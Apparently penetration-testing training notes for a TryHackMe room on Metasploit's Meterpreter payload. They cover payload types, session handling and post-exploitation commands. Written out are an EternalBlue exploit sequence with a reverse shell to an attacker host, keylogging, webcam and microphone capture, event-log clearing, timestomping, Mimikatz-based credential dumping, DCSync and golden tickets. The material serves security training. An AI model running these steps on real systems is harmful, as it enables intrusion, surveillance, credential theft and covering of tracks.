# Meterpreter Fundamentals

## Overview

Meterpreter is one of the most powerful payloads available in the Metasploit Framework.

Unlike a normal command shell, Meterpreter provides an advanced post-exploitation environment that allows penetration testers to interact with the target system, gather information, manage files, execute commands, and perform many post-exploitation tasks.

Meterpreter operates as an in-memory payload and communicates with the attacker's machine through an encrypted channel.


# What is Meterpreter?

### Definition

Meterpreter (Meta-Interpreter) is an advanced Metasploit payload that runs on the target system and provides an interactive command-and-control interface.

### Simple Architecture

```text
Attacker Machine
        │
        │ Encrypted Connection
        ▼
 Meterpreter Agent
        │
        ▼
 Target Operating System
```


# Why Meterpreter is Special

A normal reverse shell provides:

```text
Command Execution
```

Meterpreter provides:

```text
Command Execution
File Management
Process Management
Privilege Escalation
Screenshot Capture
Credential Harvesting
Pivoting
Persistence
```


# Meterpreter Characteristics

## 1. Runs in Memory

Meterpreter is not installed as a normal application.

Instead:

```text
Loaded into RAM
        ↓
Executed in Memory
        ↓
No Meterpreter.exe File
```

### Benefit

Reduces the chance of detection by file-based antivirus scanning.


## 2. No File Written to Disk

Traditional malware:

```text
malware.exe
        ↓
Saved on Disk
        ↓
AV Scan Detects File
```

Meterpreter:

```text
Payload Loaded
        ↓
Executed in Memory
        ↓
No Meterpreter.exe
```


## 3. Encrypted Communication

Meterpreter uses encrypted communication between:

```text
Target
      ↔
Attacker
```

This helps protect traffic from simple network monitoring.


## 4. Cross Platform Support

Meterpreter supports many operating systems.

### Examples

| Platform | Supported |
| -------- | --------- |
| Windows  | Yes       |
| Linux    | Yes       |
| Android  | Yes       |
| PHP      | Yes       |
| Python   | Yes       |
| Java     | Yes       |



# Meterpreter Payload Examples

## Windows

```bash
windows/meterpreter/reverse_tcp
```

## Linux

```bash
linux/x86/meterpreter/reverse_tcp
```

## PHP

```bash
php/meterpreter_reverse_tcp
```

## Android

```bash
android/meterpreter/reverse_tcp
```

# Meterpreter Session Workflow

```text
Exploit Target
        ↓
Payload Executes
        ↓
Meterpreter Starts
        ↓
Connects Back
        ↓
Session Created
```

---

# Getting a Meterpreter Session

Example:

```bash
use exploit/windows/smb/ms17_010_eternalblue

set payload windows/x64/meterpreter/reverse_tcp

set RHOSTS <TARGET-IP>

set LHOST <ATTACKER-IP>

exploit
```

Successful result:

```text
Meterpreter session 1 opened
```

---

# Interacting with Meterpreter

View active sessions:

```bash
sessions
```

Connect:

```bash
sessions -i 1
```

Prompt:

```text
meterpreter >
```

---

# Basic Meterpreter Commands

## Help

Shows available commands.

```bash
help
```

---

## System Information

```bash
sysinfo
```

Example Output:

```text
Computer : JON-PC
OS       : Windows 7 SP1
Arch     : x64
```

---

## Current User

```bash
getuid
```

Example:

```text
NT AUTHORITY\SYSTEM
```

---

## Process ID

```bash
getpid
```

Example:

```text
Current pid: 1304
```

---

# Understanding PID

PID stands for:

```text
Process Identifier
```

Every running process has a unique PID.

Example:

```text
PID 4
PID 692
PID 1304
PID 2000
```

---

# Why is PID Important?

Meterpreter runs inside an existing process.

Example:

```bash
getpid
```

Output:

```text
1304
```

---

List processes:

```bash
ps
```

Output:

```text
1304 spoolsv.exe
```

This means:

```text
Meterpreter
        ↓
Injected Into
        ↓
spoolsv.exe
```

---

# Process Enumeration

View processes:

```bash
ps
```

Example:

```text
PID     Name
1304    spoolsv.exe
1276    cmd.exe
716     lsass.exe
```

Useful for:

* Process Migration
* Privilege Escalation
* Target Analysis

---

# Why Meterpreter Is Harder to Notice

Suppose a defender checks processes.

They see:

```text
spoolsv.exe
```

instead of:

```text
meterpreter.exe
```

This helps Meterpreter blend in with legitimate processes.

---

# Example Process Tree

```text
services.exe
      │
      └── spoolsv.exe
              │
              └── Meterpreter
```

---

# DLL Inspection

Even examining loaded DLLs may not immediately reveal Meterpreter.

Example:

```cmd
tasklist /m /fi "pid eq 1304"
```

Output shows:

```text
kernel32.dll
advapi32.dll
user32.dll
```

No obvious:

```text
meterpreter.dll
```

appears.

---

# Important Reality Check

Meterpreter is stealthier than a traditional executable.

However:

```text
NOT Invisible
```

Modern:

* Antivirus
* EDR
* XDR
* Behavioral Monitoring

can often detect Meterpreter activity.

---

# Meterpreter Communication

Communication uses encrypted channels.

```text
Target
      ↓
Encrypted Traffic
      ↓
Attacker
```

Benefits:

* Harder to inspect
* Protects commands
* Protects responses

---

# Meterpreter vs Normal Shell

| Feature                    | Command Shell | Meterpreter |
| -------------------------- | ------------- | ----------- |
| Execute Commands           | Yes           | Yes         |
| File Upload                | No            | Yes         |
| File Download              | No            | Yes         |
| Process Management         | Limited       | Yes         |
| Screenshots                | No            | Yes         |
| Privilege Escalation Tools | No            | Yes         |
| In-Memory Operation        | No            | Yes         |
| Encrypted Communication    | Usually No    | Yes         |

---

# Common Meterpreter Commands

## System Information

```bash
sysinfo
```

---

## Current User

```bash
getuid
```

---

## Current Process

```bash
getpid
```

---

## Running Processes

```bash
ps
```

---

## Current Directory

```bash
pwd
```

---

## Change Directory

```bash
cd
```

---

## List Files

```bash
ls
```

---

## Upload File

```bash
upload file.txt
```

---

## Download File

```bash
download secrets.txt
```

---

## Background Session

```bash
background
```

or

```text
CTRL + Z
```

---





# Meterpreter Payloads

## Overview

Meterpreter is available in many different versions designed for different operating systems, programming languages, and network communication methods.

Choosing the correct Meterpreter payload is an important step during exploitation because the payload must be compatible with:

* The target operating system
* Available software components
* Network restrictions
* Exploit limitations


# Meterpreter Payload Architecture

```text
Exploit
    ↓
Payload Delivered
    ↓
Meterpreter Starts
    ↓
Connects To Attacker
    ↓
Meterpreter Session
```


# Staged vs Stageless Payloads

Meterpreter payloads are divided into two categories:

## 1. Staged Payloads

A staged payload is delivered in multiple steps.

### Process

```text
Stage 1 (Small Stager)
          ↓
Connect Back
          ↓
Download Stage 2
          ↓
Full Meterpreter Loaded
```

### Example

```text
windows/meterpreter/reverse_tcp
```

   

### Why Use Staged Payloads?

Benefits:

* Smaller initial payload
* Easier delivery
* Faster exploitation

### Drawbacks

* Requires additional network communication
* More likely to fail if blocked by security controls

 

# Staged Naming Convention

Notice the slash:

```text
windows/meterpreter/reverse_tcp
```

Structure:

```text
windows
    ↓
meterpreter
    ↓
reverse_tcp
```

The slash after "meterpreter" usually indicates a staged payload.

 

# 2. Stageless Payloads

Entire Meterpreter payload is delivered at once.

### Process

```text
Complete Payload
        ↓
Sent To Target
        ↓
Executed Immediately
```

### Example

```text
windows/meterpreter_reverse_tcp
```

### Benefits

* No second-stage download
* Fewer network requests
* More reliable in restricted environments

### Drawbacks

* Larger payload size


# Stageless Naming Convention

Notice the underscore:

```text
windows/meterpreter_reverse_tcp
```

Instead of:

```text
windows/meterpreter/reverse_tcp
```


# Easy Memory Trick

## Staged

```text
meterpreter/reverse_tcp
           ↑
          Slash
```

Multiple stages.


## Stageless

```text
meterpreter_reverse_tcp
           ↑
       Underscore
```

Single payload.


# Bind vs Reverse Payloads

Meterpreter supports both connection methods.


# Reverse Payload

Target connects back to attacker.

```text
Target
    ↓
Connects Back
    ↓
Attacker
```

Example:

```text
windows/meterpreter/reverse_tcp
```

# Reverse Payload Advantages

* Most commonly used
* Works through many firewalls
* Easier to manage


# Bind Payload

Target opens a listening port.

```text
Target
    ↓
Opens Port
    ↓
Attacker Connects
```

Example:

```text
windows/meterpreter/bind_tcp
```


# Bind Payload Drawbacks

* Target must accept incoming connections
* Often blocked by firewalls


# Listing Meterpreter Payloads

Use MSFVenom:

```bash
msfvenom --list payloads | grep meterpreter
```

Example Output:

```text
android/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
php/meterpreter_reverse_tcp
```


# Supported Platforms

Meterpreter supports many operating systems.

| Platform | Supported |
| -------- | --------- |
| Windows  | Yes       |
| Linux    | Yes       |
| Android  | Yes       |
| PHP      | Yes       |
| Python   | Yes       |
| Java     | Yes       |
| macOS    | Yes       |
| iOS      | Yes       |


# Common Windows Payloads

## Reverse TCP

```text
windows/meterpreter/reverse_tcp
```

Most common Windows payload.



## Reverse HTTPS

```text
windows/meterpreter/reverse_https
```

Uses HTTPS traffic.

Benefits:

* Better firewall evasion
* Blends with normal web traffic



## Reverse HTTP

```text
windows/meterpreter/reverse_http
```

Uses HTTP communication.

---

## Bind TCP

```text
windows/meterpreter/bind_tcp
```

Target waits for attacker connection.


# Common Linux Payloads

## Reverse TCP

```text
linux/x86/meterpreter/reverse_tcp
```

 
## Stageless Reverse TCP

```text
linux/x86/meterpreter_reverse_tcp
```

 

# Common PHP Payloads

Useful when exploiting web applications.

```text
php/meterpreter_reverse_tcp
```

Often used with:

* File Upload Vulnerabilities
* Remote Code Execution
* Web Shell Uploads

 

# Common Android Payloads

```text
android/meterpreter/reverse_tcp
```

```text
android/meterpreter/reverse_https
```

 

# Choosing the Correct Payload

Always consider three factors.
 

## 1. Operating System

Ask:

```text
Windows?
Linux?
Android?
macOS?
```

Examples:

```text
Windows → windows/meterpreter/*
Linux → linux/meterpreter/*
```

 

## 2. Installed Components

Ask:

```text
Is PHP Installed?
Is Python Installed?
Is Java Installed?
```

Examples:

```text
php/meterpreter_reverse_tcp
python/meterpreter_reverse_tcp
java/meterpreter/reverse_tcp
```

 

## 3. Network Restrictions

Ask:

```text
Can TCP connect out?
Can HTTPS connect out?
Are firewalls filtering traffic?
```

Examples:

```text
reverse_tcp
reverse_http
reverse_https
```

 

# Payload Selection Example

Target:

```text
Windows 10
Outbound HTTPS Allowed
```

Recommended:

```text
windows/meterpreter/reverse_https
```

 

Target:

```text
Linux Web Server
PHP Installed
```

Recommended:

```text
php/meterpreter_reverse_tcp
```

 

# Payloads and Exploits

Some exploits automatically select a default payload.

Example:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Output:

```text
Using configured payload windows/x64/meterpreter/reverse_tcp
```

 

# Viewing Compatible Payloads

After loading an exploit:

```bash
show payloads
```

Example:

```bash
use exploit/windows/smb/ms17_010_eternalblue
show payloads
```

 

# Changing Payloads

Example:

```bash
set payload windows/x64/meterpreter/reverse_https
```

Verify:

```bash
show options
```



# Staged vs Stageless Summary

| Feature          | Staged                  | Stageless               |
| ---------------- | ----------------------- | ----------------------- |
| Size             | Smaller                 | Larger                  |
| Delivery         | Multiple Steps          | Single Step             |
| Network Requests | More                    | Fewer                   |
| Reliability      | Lower                   | Higher                  |
| Example          | meterpreter/reverse_tcp | meterpreter_reverse_tcp |

 

# Meterpreter Commands

## Overview

Meterpreter provides a powerful set of built-in commands that allow penetration testers to interact with a compromised system without uploading additional tools.

Unlike a normal command shell, Meterpreter includes built-in functionality for:

* File Management
* Process Management
* Network Enumeration
* Privilege Escalation
* User Monitoring
* Screenshot Capture
* Keystroke Logging
* Credential Dumping

These commands execute directly through the Meterpreter session.

 

# Getting Help

Once connected to a Meterpreter session:

```text
meterpreter >
```

Display available commands:

```bash
help
```

or

```bash
?
```

 

# Meterpreter Command Categories

The available commands depend on the Meterpreter version and target operating system.

Common categories include:

```text
Core Commands
File System Commands
Networking Commands
System Commands
User Interface Commands
Webcam Commands
Audio Commands
Privilege Escalation Commands
Password Database Commands
Timestomp Commands
```

> Always run `help` after obtaining a Meterpreter session to see supported commands.

 

# Meterpreter Command Structure

```text
Attacker
     ↓
Meterpreter Session
     ↓
Built-in Commands
     ↓
Target System
```

Unlike traditional shells, most Meterpreter commands do not require external executables.

 

# Core Commands

Core commands help manage Meterpreter sessions.

## help

Display available commands.

```bash
help
```

 

## background

Send the current session to the background.

```bash
background
```

Alias:

```bash
bg
```

 

## exit

Terminate the current Meterpreter session.

```bash
exit
```

 

## guid

Display session GUID.

```bash
guid
```

GUID = Globally Unique Identifier

 

## sessions

Switch between active sessions.

```bash
sessions
```

 

## migrate

Move Meterpreter into another process.

```bash
migrate <PID>
```

Example:

```bash
migrate 1304
```

Useful for:

* Stability
* Privilege Escalation
* Process Injection

 

## load

Load Meterpreter extensions.

```bash
load <extension>
```

Example:

```bash
load kiwi
```

 

# File System Commands

Used to navigate and manage files.

 

## pwd

Display current working directory.

```bash
pwd
```

Example:

```text
C:\Users\Administrator
```

 

## cd

Change directory.

```bash
cd Documents
```

 

## ls

List files and directories.

```bash
ls
```

Alias:

```bash
dir
```

 

## cat

Display file contents.

```bash
cat notes.txt
```
 

## edit

Edit a file directly.

```bash
edit file.txt
```

 

## search

Search for files.

```bash
search -f passwords.txt
```

 

## upload

Upload files to target.

```bash
upload local.txt
```

Example:

```bash
upload shell.exe
```

 

## download

Download files from target.

```bash
download secrets.txt
```

 

## rm

Delete files.

```bash
rm file.txt
```

 

# File System Workflow

```text
pwd
 ↓
ls
 ↓
cd
 ↓
search
 ↓
download
```

 

# Networking Commands

Used for network enumeration and pivoting.

 

## ifconfig

Display network interfaces.

```bash
ifconfig
```

Information:

* IP Address
* Netmask
* Interface Name

 

## arp

Display ARP cache.

```bash
arp
```

Useful for identifying nearby hosts.

 

## netstat

Display network connections.

```bash
netstat
```

Shows:

* Listening Ports
* Active Connections
* Remote Hosts

 

## route

Display routing table.

```bash
route
```

 

## portfwd

Port forwarding through Meterpreter.

```bash
portfwd add
```

Used during pivoting operations.

 

# Networking Workflow

```text
ifconfig
     ↓
arp
     ↓
netstat
     ↓
route
```

 

# System Commands

Provide information about the operating system and running processes.

 

## sysinfo

Display system information.

```bash
sysinfo
```

Example:

```text
Computer : JON-PC
OS       : Windows 7 SP1
Arch     : x64
```

 

## getuid

Display current user.

```bash
getuid
```

Example:

```text
NT AUTHORITY\SYSTEM
```

 

## getpid

Display Meterpreter process ID.

```bash
getpid
```

Example:

```text
Current pid: 1304
```

 

## ps

List running processes.

```bash
ps
```

Useful for:

* Process Migration
* Privilege Escalation
* Process Analysis

 

## kill

Terminate a process.

```bash
kill <PID>
```

Example:

```bash
kill 1304
```

 

## pkill

Kill processes by name.

```bash
pkill notepad.exe
```

 

## execute

Execute programs or commands.

```bash
execute -f cmd.exe
```

 

## shell

Drop into a system command shell.

```bash
shell
```

Windows:

```cmd
C:\>
```

Linux:

```bash
$
```

Return:

```bash
exit
```

 

## reboot

Restart target system.

```bash
reboot
```

 

## shutdown

Shutdown target system.

```bash
shutdown
```

 

# User Activity Commands

Monitor user activity.

 

## idletime

Show how long the user has been inactive.

```bash
idletime
```

Example:

```text
User idle for 300 seconds
```

 

# Keystroke Capture Commands

## keyscan_start

Start keylogging.

```bash
keyscan_start
```

 

## keyscan_dump

View captured keystrokes.

```bash
keyscan_dump
```

 

## keyscan_stop

Stop keylogging.

```bash
keyscan_stop
```

  

# Screenshot Commands

## screenshot

Capture desktop screenshot.

```bash
screenshot
```

 

## screenshare

View desktop in real-time.

```bash
screenshare
```

 

# Webcam Commands

Only works if webcam exists.

 

## webcam_list

List webcams.

```bash
webcam_list
```

 

## webcam_snap

Take picture.

```bash
webcam_snap
```

 

## webcam_stream

Stream webcam feed.

```bash
webcam_stream
```

 

## webcam_chat

Start webcam chat.

```bash
webcam_chat
```

 

# Audio Commands

## record_mic

Record microphone audio.

```bash
record_mic
```

 

# Privilege Escalation Commands

 

## getsystem

Attempt to obtain SYSTEM privileges.

```bash
getsystem
```

Possible result:

```text
NT AUTHORITY\SYSTEM
```

 

# Credential Access Commands

 

## hashdump

Dump password hashes from SAM database.

```bash
hashdump
```

Example:

```text
Administrator:500:aad3...
```

 

# Log Manipulation Commands

 

## clearev

Clear Windows event logs.

```bash
clearev
```

 

# Timestomp Commands

Modify file timestamps.

Used to alter:

* Creation Time
* Modified Time
* Access Time

Command:

```bash
timestomp
```

 

# Common Meterpreter Workflow

```text
sysinfo
     ↓
getuid
     ↓
getpid
     ↓
ps
     ↓
migrate
     ↓
pwd
     ↓
ls
     ↓
search
     ↓
download
```

# Meterpreter Post-Exploitation Essentials

## Overview

After gaining a Meterpreter session, the next phase is **Post-Exploitation**.

Post-exploitation involves:

* Gathering information
* Identifying user privileges
* Exploring the file system
* Searching for sensitive files
* Dumping credentials
* Maintaining stable access

Meterpreter provides built-in commands that make these tasks much easier.



# Post-Exploitation Workflow

```text
Gain Access
     ↓
Identify Current User
     ↓
Gather System Information
     ↓
Enumerate Processes
     ↓
Migrate to Stable Process
     ↓
Search for Sensitive Files
     ↓
Collect Credentials
     ↓
Interact with System
```



# 1. Help Command

The first command you should run after obtaining a Meterpreter session.

### Purpose

Display all available Meterpreter commands.

### Command

```bash
help
```

or

```bash
?
```

### Why Use It?

Different Meterpreter payloads support different commands.

Example:

* Windows Meterpreter
* Linux Meterpreter
* PHP Meterpreter
* Android Meterpreter

Each version has different capabilities.

  

# 2. getuid

### Purpose

Displays the current user account under which Meterpreter is running.

### Command

```bash
getuid
```

### Example

```text
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

### Why Is It Important?

Determines privilege level.

Examples:

| User                | Privilege Level |
| ------------------- | --------------- |
| Guest               | Very Low        |
| User                | Standard User   |
| Administrator       | High            |
| NT AUTHORITY\SYSTEM | Highest         |

 

# 3. ps (Process Enumeration)

### Purpose

Lists all running processes.

### Command

```bash
ps
```

### Example Output

```text
PID     Name
716     lsass.exe
1304    spoolsv.exe
1276    cmd.exe
```

### Why Is It Important?

Used for:

* Process analysis
* Process migration
* Identifying user applications
* Finding stable processes

 

# Understanding PID

PID stands for:

```text
Process Identifier
```

Every running process has a unique PID.

Example:

```text
716
1304
1276
```

These IDs are used by Meterpreter for migration and process interaction.

  

# 4. Migrate

### Purpose

Move Meterpreter into another running process.

### Command

```bash
migrate <PID>
```

Example:

```bash
migrate 716
```

### Example Output

```text
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```
 

# Why Migrate?

Benefits:

### Better Stability

```text
Original Process Dies
        ↓
Session Lost
```

Migrating to a stable system process can help maintain access.

 

### User Activity Monitoring

Example:

```text
notepad.exe
word.exe
chrome.exe
```

Migrating into an actively used process may allow interaction with user activity.

 
### Process Injection

Meterpreter becomes associated with another process.

Example:

```text
Meterpreter
      ↓
spoolsv.exe
```

instead of:

```text
Meterpreter.exe
```

 

# Migration Warning

Be careful when migrating.

Example:

```text
SYSTEM Process
        ↓
Migrate
        ↓
Regular User Process
```

You may lose higher privileges.

Always check privileges again:

```bash
getuid
```

 

# 5. hashdump

### Purpose

Dump password hashes from the Windows SAM database.

### Command

```bash
hashdump
```

### Example

```text
Administrator:500:aad3...
Guest:501:aad3...
Jon:1000:ffb43f...
```

 

# What Is SAM?

SAM stands for:

```text
Security Account Manager
```

Windows stores local account password hashes in this database.

 

# NTLM Hashes

Hashes are commonly stored in:

```text
NTLM Format
```

Example:

```text
ffb43f0de35be4d9917ac0cc8ad57f8d
```

 

# Why Are Hashes Valuable?

They may allow:

* Password recovery attempts
* Credential analysis
* Authentication testing
* Lateral movement assessments

 

# 6. search

### Purpose

Find files on the target system.

### Command

```bash
search -f filename.txt
```

### Example

```bash
search -f flag2.txt
```

Output:

```text
Found 1 result

c:\Windows\System32\config\flag2.txt
```

  

# Common Search Targets

Configuration Files

```text
config.php
web.config
database.yml
```

 

Credential Files

```text
passwords.txt
credentials.txt
accounts.xlsx
```

 

CTF Flags

```text
flag.txt
flag1.txt
flag2.txt
proof.txt
```

 

# Search Examples

Search for text files:

```bash
search -f *.txt
```

Search for configuration files:

```bash
search -f *.config
```

Search for passwords:

```bash
search -f *pass*
```

 

# 7. shell

### Purpose

Open a normal operating system command shell.

### Command

```bash
shell
```

 

# Example

```text
meterpreter > shell

Process 2124 created.
Channel 1 created.
```

Windows:

```cmd
C:\Windows\system32>
```

Linux:

```bash
$
```

 

# Why Use Shell?

Some commands are easier to run directly.

Examples:

```cmd
ipconfig
whoami
net user
tasklist
```

Linux:

```bash
ifconfig
id
uname -a
```

 

# Returning to Meterpreter

Press:

```text
CTRL + Z
```

or exit the shell:

```bash
exit
```

 

# Typical Enumeration Sequence

After gaining access:

### Step 1

Identify privilege level.

```bash
getuid
```

 

### Step 2

Gather system information.

```bash
sysinfo
```

 

### Step 3

View processes.

```bash
ps
```

 

### Step 4

Migrate if necessary.

```bash
migrate <PID>
```

 

### Step 5

Search for sensitive files.

```bash
search -f *.txt
```

 

### Step 6

Inspect files.

```bash
cat filename.txt
```

 

### Step 7

Open command shell if needed.

```bash
shell
```

 

# Common Post-Exploitation Commands

| Command  | Purpose                 |
| -------- | ----------------------- |
| help     | Show available commands |
| getuid   | Show current user       |
| sysinfo  | System information      |
| ps       | Running processes       |
| migrate  | Move to another process |
| search   | Search for files        |
| cat      | View file contents      |
| shell    | Open command shell      |
| hashdump | Dump password hashes    |
| download | Download files          |
| upload   | Upload files            |

 

# Quick Revision

### Show Available Commands

```bash
help
```

### Current User

```bash
getuid
```

### Running Processes

```bash
ps
```

### Migrate Process

```bash
migrate <PID>
```

### Dump Password Hashes

```bash
hashdump
```

### Search for Files

```bash
search -f filename.txt
```

### Open Shell

```bash
shell
```

---




# Meterpreter Extensions and Post-Exploitation

## Overview

After gaining access to a target system, the next stage is **Post-Exploitation**.

The purpose of post-exploitation is not simply to maintain access but to:

* Gather additional information
* Identify valuable files
* Discover credentials
* Escalate privileges
* Move laterally across the network
* Understand the target environment

Meterpreter provides built-in commands and extensions that help accomplish these goals.

 

# Post-Exploitation Goals

```text
Initial Access
       ↓
Information Gathering
       ↓
Privilege Escalation
       ↓
Credential Access
       ↓
Persistence
       ↓
Lateral Movement
```

  

# Meterpreter Extensions

Meterpreter can be extended using the:

```bash
load
```

command.

Extensions add additional functionality without uploading external tools.

 

# Syntax

```bash
load <extension>
```

Example:

```bash
load python
```

or

```bash
load kiwi
```
 

# Viewing Loaded Commands

After loading an extension:

```bash
help
```

New commands become available in the help menu.

Always run:

```bash
help
```

after loading a new extension.

 

# Python Extension

## Purpose

Allows Python code execution directly from Meterpreter.

 

## Loading Python

```bash
meterpreter > load python
```

Example Output:

```text
Loading extension python...Success.
```
 

## Execute Python Code

```bash
python_execute "print('TryHackMe Rocks!')"
```

Example Output:

```text
TryHackMe Rocks!
```

 

# Why Use Python?

Python can be used for:

* Automation
* Enumeration
* Data Collection
* Custom Scripts
* Information Gathering

 

# Kiwi Extension

One of the most powerful Meterpreter extensions.

Kiwi is based on:

```text
Mimikatz
```

which is widely used for Windows credential extraction.

 

# Loading Kiwi

```bash
meterpreter > load kiwi
```

Example Output:

```text
Loading extension kiwi...Success.
```

 

# What Kiwi Provides

```text
Credential Extraction
Kerberos Ticket Operations
Password Dumping
SAM Extraction
Wi-Fi Credential Extraction
Domain Replication Attacks
```

 

# Updated Help Menu

After loading Kiwi:

```bash
help
```

New section:

```text
Kiwi Commands
```

appears.

 

# Credential Extraction Commands

## creds_all

Retrieve all available credentials.

```bash
creds_all
```

 

## creds_msv

Retrieve NTLM credentials.

```bash
creds_msv
```

 

## creds_wdigest

Retrieve WDigest credentials.

```bash
creds_wdigest
```

 

## creds_kerberos

Retrieve Kerberos credentials.

```bash
creds_kerberos
```

 

## creds_ssp

Retrieve SSP credentials.

```bash
creds_ssp
```

 

## creds_tspkg

Retrieve TsPkg credentials.

```bash
creds_tspkg
```

 

# SAM Database Extraction

## lsa_dump_sam

Extract SAM information.

```bash
lsa_dump_sam
```

 

# LSA Secrets Extraction

## lsa_dump_secrets

Extract Local Security Authority secrets.

```bash
lsa_dump_secrets
```

 

# Kerberos Operations

Kerberos is the primary authentication protocol used in Active Directory environments.

 

## List Kerberos Tickets

```bash
kerberos_ticket_list
```

 

## Use Kerberos Ticket

```bash
kerberos_ticket_use
```

 

## Purge Tickets

```bash
kerberos_ticket_purge
```

 

# DCSync Operations

DCSync simulates a Domain Controller requesting password data.

 

## Retrieve Domain Information

```bash
dcsync
```
 

## Retrieve NTLM Hashes

```bash
dcsync_ntlm
```

 

# Golden Ticket Creation

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT).

Command:

```bash
golden_ticket_create
```

 

# Password Management

## Change User Password

```bash
password_change
```

 

# Wi-Fi Credential Discovery

Useful on laptops and workstation systems.

 

## Current User Wi-Fi Profiles

```bash
wifi_list
```

 

## Shared Wi-Fi Profiles

```bash
wifi_list_shared
```

Requires:

```text
SYSTEM Privileges
```

 

# Common Post-Exploitation Tasks

## 1. Information Gathering

Gather:

* Hostname
* Operating System
* Users
* Network Interfaces
* Running Services

Commands:

```bash
sysinfo
getuid
ifconfig
ps
```

 

## 2. Search for Sensitive Files

Examples:

```bash
search -f passwords.txt
```

```bash
search -f *.config
```

```bash
search -f *.xlsx
```

 

# Interesting Files

Common targets:

```text
passwords.txt
credentials.txt
config.php
database.yml
web.config
backup.zip
```

 

## 3. Credential Collection

Examples:

```bash
hashdump
creds_all
lsa_dump_sam
```

 

## 4. Privilege Escalation

Examples:

```bash
getuid
getsystem
```

Goal:

```text
Administrator
        ↓
SYSTEM
```

 

## 5. Lateral Movement

Move from one system to another.

Requirements:

```text
Credentials
Hashes
Tickets
Network Access
```

Common Sources:

```text
SAM Database
Kerberos Tickets
Saved Credentials
```

 

# Example Workflow

```text
Gain Meterpreter Session
            ↓
sysinfo
            ↓
getuid
            ↓
load kiwi
            ↓
creds_all
            ↓
hashdump
            ↓
search -f passwords.txt
            ↓
getsystem
            ↓
Explore Network
```

 

# Extension Workflow

```text
Meterpreter Session
          ↓
load kiwi
          ↓
New Commands Available
          ↓
help
          ↓
Credential Collection
```
 

# Most Important Commands

| Command          | Purpose                       |
| ---------------- | ----------------------------- |
| load python      | Load Python support           |
| python_execute   | Execute Python code           |
| load kiwi        | Load Kiwi extension           |
| creds_all        | Retrieve credentials          |
| creds_msv        | Retrieve NTLM credentials     |
| creds_kerberos   | Retrieve Kerberos credentials |
| lsa_dump_sam     | Dump SAM data                 |
| lsa_dump_secrets | Dump LSA secrets              |
| dcsync           | Domain replication attack     |
| dcsync_ntlm      | Retrieve NTLM hashes          |
| wifi_list        | Show Wi-Fi credentials        |
| password_change  | Change user password          |

---
